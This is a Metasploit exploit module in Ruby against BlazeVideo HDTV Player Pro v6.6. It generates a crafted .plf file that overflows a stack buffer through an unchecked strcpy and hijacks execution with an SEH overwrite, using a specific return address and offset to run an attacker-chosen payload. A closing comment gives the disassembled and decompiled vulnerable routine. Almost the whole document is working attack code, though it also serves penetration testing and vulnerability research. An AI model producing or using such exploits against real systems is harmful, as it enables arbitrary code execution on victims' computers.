# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "BlazeVideo HDTV Player Pro v6.6 Filename Handling Vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in BlazeVideo HDTV Player&#039;s filename
        handling routine.  When supplying a string of input data embedded in a .plf file,
        the MediaPlayerCtrl.dll component will try to extract a filename by using
        PathFindFileNameA(), and then copies whatever the return value is on the stack by
        using an inline strcpy.  As a result, if this input data is long enough, it can cause
        a stack-based buffer overflow, which may lead to arbitrary code execution under the
        context of the user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;b33f&#039;,   #Original
          &#039;sinn3r&#039;  #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;80896&#039;],
          [&#039;EDB&#039;, &#039;18693&#039;],
          [&#039;EDB&#039;, &#039;22931&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;        => "\x00\x0a\x1a\x2f\x3a\x5c",
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "seh"
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # MediaPlayerCtrl.dll P/P/R
          # Tested on: Windows 7 SP1/SP0, Windows XP SP3 / Windows Vista SP2/SP1/SP0
          [&#039;BlazeVideo HDTV Player Pro v6.6.0.3&#039;, {&#039;Ret&#039;=>0x64020327, &#039;Offset&#039;=>868}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Apr 03 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.plf&#039;])
      ], self.class)
  end

  def exploit
    buf = &#039;http://&#039;
    buf << rand_text_alpha_upper(target[&#039;Offset&#039;])
    buf << generate_seh_record(target.ret)
    buf << payload.encoded
    buf << rand_text_alpha(5000-buf.length)

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039;...")
    file_create(buf)
  end
end

=begin
Version: HDTV Player Professional v6.6

In MediaPlayerCtrl.dll (File version: 2.0.0.2; Product version: 2.0.0.2)
.text:6400E574                 mov     eax, [esp+138h+Source]
.text:6400E578                 mov     edx, [ebp+0ECh]
.text:6400E57E                 push    eax
.text:6400E57F                 push    eax             ; pszPath  <-- Our URL
.text:6400E580                 mov     edi, [edx]
.text:6400E582                 call    ebx ; PathFindFileNameA
.text:6400E584                 mov     ecx, [ebp+0ECh]
.text:6400E58A                 push    eax             ; File path to copy
.text:6400E58B                 push    esi
.text:6400E58C                 push    1
.text:6400E58E                 call    dword ptr [edi] ; 0x6400f1f0

0x6400F1F0 (no length check either) goes down to 0x6400F670:

int __thiscall sub_6400F670(int this, int a2, int a3, const char *source, const char *a5)
{
  ...

  v5 = this;
  if ( a2 && source && a5 )
  {
    memset(&buffer, 0, &#039;\x02\x10&#039;);
    v16 = *(this + 4);
    *(this + 4) = v16 + 1;
    v18 = a3;
    buffer = a2;
    strcpy(&Dest2, source);  // <-- This is a rep movs
=end

